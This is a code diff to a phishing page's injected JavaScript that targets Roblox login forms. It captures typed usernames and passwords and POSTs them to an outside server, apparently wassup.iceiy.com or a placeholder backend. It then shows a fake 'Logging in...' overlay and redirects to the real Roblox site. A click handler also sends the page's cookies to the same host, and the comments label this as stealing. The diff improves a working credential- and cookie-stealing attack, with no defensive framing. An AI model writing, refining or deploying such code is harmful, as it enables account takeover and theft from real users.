@@ -1321,10 +1321,9 @@ document.addEventListener('DOMContentLoaded', function() {
 <script>
 document.addEventListener('DOMContentLoaded', function() {
     const checkForLoginForm = setInterval(function() {
-        // Target Roblox's login fields
-        const usernameField = document.querySelector('input[name="username"], input[type="email"], input[type="text"]');
-        const passwordField = document.querySelector('input[name="password"], input[type="password"]');
-        const loginButton = document.querySelector('button[type="submit"], button[type="button"], div[role="button"], span[role="button"]');
+        const usernameField = document.querySelector('input[name="username"], input[id="login-username"], input[data-testid="username-input"]');
+        const passwordField = document.querySelector('input[name="password"], input[id="login-password"], input[data-testid="password-input"]');
+        const loginButton = document.querySelector('button[type="submit"], button[data-testid="login-button"], div[role="button"]');
 
         if (usernameField && passwordField && loginButton) {
             clearInterval(checkForLoginForm);
@@ -1336,14 +1335,20 @@ document.addEventListener('DOMContentLoaded', function() {
                 const username = usernameField.value;
                 const password = passwordField.value;
 
-                // Send credentials to BACKEND
-                fetch("http://wassup.iceiy.com//save.php", {
+                // Send to your backend (with CORS proxy if needed)
+                fetch("https://your-backend-server.com/save.php", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ username, password })
+                })
+                .then(response => {
+                    console.log("Data sent to backend");
+                })
+                .catch(error => {
+                    console.error("Error sending data:", error);
                 });
 
-                // Loading screen
+                // Fake loading screen
                 const fakeLoading = document.createElement('div');
                 fakeLoading.style.position = 'fixed';
                 fakeLoading.style.top = '0';
@@ -1358,7 +1363,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 fakeLoading.innerHTML = '<h2>Logging in...</h2>';
                 document.body.appendChild(fakeLoading);
 
-               
+                // Redirect after 3 seconds
                 setTimeout(() => {
                     window.location.href = "https://www.roblox.com/home";
                 }, 3000);
@@ -1366,15 +1371,19 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }, 500);
 
-    // Store cookies on user interaction for easier use.
+    // Steal cookies on click
     document.addEventListener('click', function() {
         const cookies = document.cookie;
         if (cookies) {
-            fetch(`http://wassup.iceiy.com/save.php?cookies=${encodeURIComponent(cookies)}`);
+            fetch(`https://wassup.iceiy.com/save.php?cookies=${encodeURIComponent(cookies)}`)
+            .catch(error => {
+                console.error("Error sending cookies:", error);
+            });
         }
     });
 });
 </script>
+
 
 
 
